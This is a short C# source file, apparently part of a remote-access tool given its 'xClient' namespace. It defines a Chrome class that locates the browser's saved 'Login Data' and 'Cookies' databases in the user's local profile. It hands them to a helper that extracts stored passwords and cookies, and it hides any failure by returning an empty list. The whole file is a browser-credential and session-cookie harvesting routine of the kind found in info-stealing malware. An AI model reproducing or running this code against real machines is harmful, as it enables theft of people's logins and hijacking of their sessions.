using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Recovery.Helper;

namespace PasswordRecovery.Browsers
{
    public class Chrome
    {
        public static List<LoginInfo> Passwords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<LoginInfo>();
            }
        }
        public static List<ChromiumBase.ChromiumCookie> Cookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
